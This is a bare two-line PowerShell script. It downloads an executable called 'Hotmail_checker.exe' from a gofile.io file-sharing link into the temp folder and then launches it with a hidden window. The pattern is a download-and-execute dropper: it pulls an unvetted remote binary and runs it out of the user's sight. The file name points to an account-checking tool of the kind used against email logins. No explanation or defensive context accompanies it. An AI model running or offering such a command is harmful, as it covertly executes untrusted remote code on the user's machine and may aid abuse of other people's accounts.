Invoke-WebRequest -Uri "https://cold-eu-agl-1.gofile.io/download/web/cf8ab565-842e-4f6e-a9bb-4b6e05c83e40/Hotmail_checker.exe" -OutFile "$env:TEMP\Hotmail_checker.exe"

Start-Process -FilePath "$env:TEMP\Hotmail_checker.exe" -WindowStyle Hidden
